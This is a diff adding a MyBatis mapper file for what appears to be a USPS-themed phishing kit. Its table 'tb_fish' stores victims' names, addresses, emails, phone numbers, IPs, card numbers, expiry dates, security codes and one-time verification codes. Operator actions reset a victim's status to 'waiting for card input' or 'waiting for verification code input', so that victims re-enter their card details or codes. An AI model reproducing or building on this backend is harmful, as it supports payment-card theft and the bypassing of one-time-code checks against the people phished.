@@ -1,0 +1,386 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
+<mapper namespace="com.uspsassa.phishing.mapper.FishMapper">
+    <resultMap id="BaseResultMap" type="com.uspsassa.phishing.entity.Fish">
+        <!--@mbg.generated-->
+        <!--@Table phishing.tb_fish-->
+        <id column="id" jdbcType="INTEGER" property="id"/>
+        <result column="sid" jdbcType="VARCHAR" property="sid"/>
+        <result column="name" jdbcType="VARCHAR" property="name"/>
+        <result column="address" jdbcType="VARCHAR" property="address"/>
+        <result column="address_option" jdbcType="VARCHAR" property="addressOption"/>
+        <result column="city" jdbcType="VARCHAR" property="city"/>
+        <result column="email" jdbcType="VARCHAR" property="email"/>
+        <result column="phone_number" jdbcType="VARCHAR" property="phoneNumber"/>
+        <result column="card_number" jdbcType="VARCHAR" property="cardNumber"/>
+        <result column="exp_date" jdbcType="VARCHAR" property="expDate"/>
+        <result column="zip_code" jdbcType="VARCHAR" property="zipCode"/>
+        <result column="security_code" jdbcType="VARCHAR" property="securityCode"/>
+        <result column="verification_code" jdbcType="VARCHAR" property="verificationCode"/>
+        <result column="status" jdbcType="VARCHAR" property="status"/>
+        <result column="device_type" jdbcType="VARCHAR" property="deviceType"/>
+        <result column="ip" jdbcType="VARCHAR" property="ip"/>
+        <result column="create_time" jdbcType="BIGINT" property="createTime"/>
+    </resultMap>
+    <sql id="Base_Column_List">
+        <!--@mbg.generated-->
+        id,
+        sid,
+        `name`,
+        address,
+        address_option,
+        city,
+        `email`,
+        phone_number,
+        card_number,
+        exp_date,
+        zip_code,
+        security_code,
+        verification_code,
+        `status`,
+        device_type,
+        ip,
+        create_time
+    </sql>
+    <select id="selectByPrimaryKey" parameterType="java.lang.Integer" resultMap="BaseResultMap">
+        <!--@mbg.generated-->
+        select
+        <include refid="Base_Column_List"/>
+        from phishing.tb_fish
+        where id = #{id,jdbcType=INTEGER}
+    </select>
+    <delete id="deleteByPrimaryKey" parameterType="java.lang.Integer">
+        <!--@mbg.generated-->
+        delete
+        from phishing.tb_fish
+        where id = #{id,jdbcType=INTEGER}
+    </delete>
+    <insert id="insert" parameterType="com.uspsassa.phishing.entity.Fish">
+        <!--@mbg.generated-->
+        insert into phishing.tb_fish (id, sid, `name`,
+                                      address, address_option, city,
+                                      `email`, phone_number, card_number,
+                                      exp_date, zip_code, security_code,
+                                      verification_code, `status`, device_type,
+                                      ip)
+        values (#{id,jdbcType=INTEGER}, #{sid,jdbcType=VARCHAR}, #{name,jdbcType=VARCHAR},
+                #{address,jdbcType=VARCHAR}, #{addressOption,jdbcType=VARCHAR}, #{city,jdbcType=VARCHAR},
+                #{email,jdbcType=VARCHAR}, #{phoneNumber,jdbcType=VARCHAR}, #{cardNumber,jdbcType=VARCHAR},
+                #{expDate,jdbcType=VARCHAR}, #{zipCode,jdbcType=VARCHAR}, #{securityCode,jdbcType=VARCHAR},
+                #{verificationCode,jdbcType=VARCHAR}, #{status,jdbcType=VARCHAR}, #{deviceType,jdbcType=VARCHAR},
+                #{ip,jdbcType=VARCHAR})
+    </insert>
+    <insert id="insertSelective" parameterType="com.uspsassa.phishing.entity.Fish" keyProperty="id" useGeneratedKeys="true">
+        <!--@mbg.generated-->
+        insert into phishing.tb_fish
+        <trim prefix="(" suffix=")" suffixOverrides=",">
+            <if test="id != null">
+                id,
+            </if>
+            <if test="sid != null and sid != ''">
+                sid,
+            </if>
+            <if test="name != null and name != ''">
+                `name`,
+            </if>
+            <if test="address != null and address != ''">
+                address,
+            </if>
+            <if test="addressOption != null and addressOption != ''">
+                address_option,
+            </if>
+            <if test="city != null and city != ''">
+                city,
+            </if>
+            <if test="email != null and email != ''">
+                `email`,
+            </if>
+            <if test="phoneNumber != null and phoneNumber != ''">
+                phone_number,
+            </if>
+            <if test="cardNumber != null and cardNumber != ''">
+                card_number,
+            </if>
+            <if test="expDate != null and expDate != ''">
+                exp_date,
+            </if>
+            <if test="zipCode != null and zipCode != ''">
+                zip_code,
+            </if>
+            <if test="securityCode != null and securityCode != ''">
+                security_code,
+            </if>
+            <if test="verificationCode != null and verificationCode != ''">
+                verification_code,
+            </if>
+            <if test="status != null and status != ''">
+                `status`,
+            </if>
+            <if test="deviceType != null and deviceType != ''">
+                device_type,
+            </if>
+            <if test="ip != null and ip != ''">
+                ip,
+            </if>
+            <if test="createTime != null">
+                create_time,
+            </if>
+        </trim>
+        <trim prefix="values (" suffix=")" suffixOverrides=",">
+            <if test="id != null">
+                #{id,jdbcType=INTEGER},
+            </if>
+            <if test="sid != null and sid != ''">
+                #{sid,jdbcType=VARCHAR},
+            </if>
+            <if test="name != null and name != ''">
+                #{name,jdbcType=VARCHAR},
+            </if>
+            <if test="address != null and address != ''">
+                #{address,jdbcType=VARCHAR},
+            </if>
+            <if test="addressOption != null and addressOption != ''">
+                #{addressOption,jdbcType=VARCHAR},
+            </if>
+            <if test="city != null and city != ''">
+                #{city,jdbcType=VARCHAR},
+            </if>
+            <if test="email != null and email != ''">
+                #{email,jdbcType=VARCHAR},
+            </if>
+            <if test="phoneNumber != null and phoneNumber != ''">
+                #{phoneNumber,jdbcType=VARCHAR},
+            </if>
+            <if test="cardNumber != null and cardNumber != ''">
+                #{cardNumber,jdbcType=VARCHAR},
+            </if>
+            <if test="expDate != null and expDate != ''">
+                #{expDate,jdbcType=VARCHAR},
+            </if>
+            <if test="zipCode != null and zipCode != ''">
+                #{zipCode,jdbcType=VARCHAR},
+            </if>
+            <if test="securityCode != null and securityCode != ''">
+                #{securityCode,jdbcType=VARCHAR},
+            </if>
+            <if test="verificationCode != null and verificationCode != ''">
+                #{verificationCode,jdbcType=VARCHAR},
+            </if>
+            <if test="status != null and status != ''">
+                #{status,jdbcType=VARCHAR},
+            </if>
+            <if test="deviceType != null and deviceType != ''">
+                #{deviceType,jdbcType=VARCHAR},
+            </if>
+            <if test="ip != null and ip != ''">
+                #{ip,jdbcType=VARCHAR},
+            </if>
+            <if test="createTime != null">
+                #{createTime,jdbcType=TIMESTAMP},
+            </if>
+        </trim>
+    </insert>
+    <update id="updateByPrimaryKeySelective" parameterType="com.uspsassa.phishing.entity.Fish">
+        <!--@mbg.generated-->
+        update phishing.tb_fish
+        <set>
+            <if test="sid != null and sid != ''">
+                sid = #{sid,jdbcType=VARCHAR},
+            </if>
+            <if test="name != null and name != ''">
+                `name` = #{name,jdbcType=VARCHAR},
+            </if>
+            <if test="address != null and address != ''">
+                address = #{address,jdbcType=VARCHAR},
+            </if>
+            <if test="addressOption != null and addressOption != ''">
+                address_option = #{addressOption,jdbcType=VARCHAR},
+            </if>
+            <if test="city != null and city != ''">
+                city = #{city,jdbcType=VARCHAR},
+            </if>
+            <if test="email != null and email != ''">
+                `email` = #{email,jdbcType=VARCHAR},
+            </if>
+            <if test="phoneNumber != null and phoneNumber != ''">
+                phone_number = #{phoneNumber,jdbcType=VARCHAR},
+            </if>
+            <if test="cardNumber != null and cardNumber != ''">
+                card_number = #{cardNumber,jdbcType=VARCHAR},
+            </if>
+            <if test="expDate != null and expDate != ''">
+                exp_date = #{expDate,jdbcType=VARCHAR},
+            </if>
+            <if test="zipCode != null and zipCode != ''">
+                zip_code = #{zipCode,jdbcType=VARCHAR},
+            </if>
+            <if test="securityCode != null and securityCode != ''">
+                security_code = #{securityCode,jdbcType=VARCHAR},
+            </if>
+            <if test="verificationCode != null and verificationCode != ''">
+                verification_code = #{verificationCode,jdbcType=VARCHAR},
+            </if>
+            <if test="status != null and status != ''">
+                `status` = #{status,jdbcType=VARCHAR},
+            </if>
+            <if test="deviceType != null and deviceType != ''">
+                device_type = #{deviceType,jdbcType=VARCHAR},
+            </if>
+            <if test="ip != null and ip != ''">
+                ip = #{ip,jdbcType=VARCHAR},
+            </if>
+        </set>
+        where id = #{id,jdbcType=INTEGER}
+    </update>
+    <update id="updateByPrimaryKey" parameterType="com.uspsassa.phishing.entity.Fish">
+        <!--@mbg.generated-->
+        update phishing.tb_fish
+        set sid               = #{sid,jdbcType=VARCHAR},
+            `name`            = #{name,jdbcType=VARCHAR},
+            address           = #{address,jdbcType=VARCHAR},
+            address_option    = #{addressOption,jdbcType=VARCHAR},
+            city              = #{city,jdbcType=VARCHAR},
+            `email`           = #{email,jdbcType=VARCHAR},
+            phone_number      = #{phoneNumber,jdbcType=VARCHAR},
+            card_number       = #{cardNumber,jdbcType=VARCHAR},
+            exp_date          = #{expDate,jdbcType=VARCHAR},
+            zip_code          = #{zipCode,jdbcType=VARCHAR},
+            security_code     = #{securityCode,jdbcType=VARCHAR},
+            verification_code = #{verificationCode,jdbcType=VARCHAR},
+            `status`          = #{status,jdbcType=VARCHAR},
+            device_type       = #{deviceType,jdbcType=VARCHAR},
+            ip                = #{ip,jdbcType=VARCHAR},
+            create_time       = #{createTime,jdbcType=BIGINT}
+        where id = #{id,jdbcType=INTEGER}
+    </update>
+    <select id="findByAll" resultMap="BaseResultMap">
+        <!--@mbg.generated-->
+        select
+        <include refid="Base_Column_List"/>
+        from phishing.tb_fish
+        <where>
+            <if test="id != null">
+                and id = #{id,jdbcType=INTEGER}
+            </if>
+            <if test="sid != null and sid != ''">
+                and sid = #{sid,jdbcType=VARCHAR}
+            </if>
+            <if test="name != null and name != ''">
+                and `name` = #{name,jdbcType=VARCHAR}
+            </if>
+            <if test="address != null and address != ''">
+                and address = #{address,jdbcType=VARCHAR}
+            </if>
+            <if test="addressOption != null and addressOption != ''">
+                and address_option = #{addressOption,jdbcType=VARCHAR}
+            </if>
+            <if test="city != null and city != ''">
+                and city = #{city,jdbcType=VARCHAR}
+            </if>
+            <if test="email != null and email != ''">
+                and `email` = #{email,jdbcType=VARCHAR}
+            </if>
+            <if test="phoneNumber != null and phoneNumber != ''">
+                and phone_number = #{phoneNumber,jdbcType=VARCHAR}
+            </if>
+            <if test="cardNumber != null and cardNumber != ''">
+                and card_number = #{cardNumber,jdbcType=VARCHAR}
+            </if>
+            <if test="expDate != null and expDate != ''">
+                and exp_date = #{expDate,jdbcType=VARCHAR}
+            </if>
+            <if test="zipCode != null and zipCode != ''">
+                and zip_code = #{zipCode,jdbcType=VARCHAR}
+            </if>
+            <if test="securityCode != null and securityCode != ''">
+                and security_code = #{securityCode,jdbcType=VARCHAR}
+            </if>
+            <if test="verificationCode != null and verificationCode != ''">
+                and verification_code = #{verificationCode,jdbcType=VARCHAR}
+            </if>
+            <if test="status != null and status != ''">
+                and `status` = #{status,jdbcType=VARCHAR}
+            </if>
+            <if test="deviceType != null and deviceType != ''">
+                and device_type = #{deviceType,jdbcType=VARCHAR}
+            </if>
+            <if test="ip != null and ip != ''">
+                and ip = #{ip,jdbcType=VARCHAR}
+            </if>
+        </where>
+    </select>
+    <select id="findOneByAll" resultMap="BaseResultMap">
+        <!--@mbg.generated-->
+        select
+        <include refid="Base_Column_List"/>
+        from phishing.tb_fish
+        <where>
+            <if test="id != null">
+                and id = #{id,jdbcType=INTEGER}
+            </if>
+            <if test="sid != null and sid != ''">
+                and sid = #{sid,jdbcType=VARCHAR}
+            </if>
+            <if test="name != null and name != ''">
+                and `name` = #{name,jdbcType=VARCHAR}
+            </if>
+            <if test="address != null and address != ''">
+                and address = #{address,jdbcType=VARCHAR}
+            </if>
+            <if test="addressOption != null and addressOption != ''">
+                and address_option = #{addressOption,jdbcType=VARCHAR}
+            </if>
+            <if test="city != null and city != ''">
+                and city = #{city,jdbcType=VARCHAR}
+            </if>
+            <if test="email != null and email != ''">
+                and `email` = #{email,jdbcType=VARCHAR}
+            </if>
+            <if test="phoneNumber != null and phoneNumber != ''">
+                and phone_number = #{phoneNumber,jdbcType=VARCHAR}
+            </if>
+            <if test="cardNumber != null and cardNumber != ''">
+                and card_number = #{cardNumber,jdbcType=VARCHAR}
+            </if>
+            <if test="expDate != null and expDate != ''">
+                and exp_date = #{expDate,jdbcType=VARCHAR}
+            </if>
+            <if test="zipCode != null and zipCode != ''">
+                and zip_code = #{zipCode,jdbcType=VARCHAR}
+            </if>
+            <if test="securityCode != null and securityCode != ''">
+                and security_code = #{securityCode,jdbcType=VARCHAR}
+            </if>
+            <if test="verificationCode != null and verificationCode != ''">
+                and verification_code = #{verificationCode,jdbcType=VARCHAR}
+            </if>
+            <if test="status != null and status != ''">
+                and `status` = #{status,jdbcType=VARCHAR}
+            </if>
+            <if test="deviceType != null and deviceType != ''">
+                and device_type = #{deviceType,jdbcType=VARCHAR}
+            </if>
+            <if test="ip != null and ip != ''">
+                and ip = #{ip,jdbcType=VARCHAR}
+            </if>
+        </where>
+    </select>
+
+    <delete id="deleteBySid">
+        delete
+        from phishing.tb_fish
+        where sid = #{sid,jdbcType=VARCHAR}
+    </delete>
+
+    <delete id="codeReject">
+        update phishing.tb_fish
+        set status = '等待验证码输入',verification_code=''
+        where id = #{id,jdbcType=VARCHAR}
+    </delete>
+
+    <delete id="cardReject">
+        update phishing.tb_fish
+        set status = '等待卡输入',card_number='',exp_date='',security_code=''
+        where id = #{id,jdbcType=VARCHAR}
+    </delete>
+</mapper>
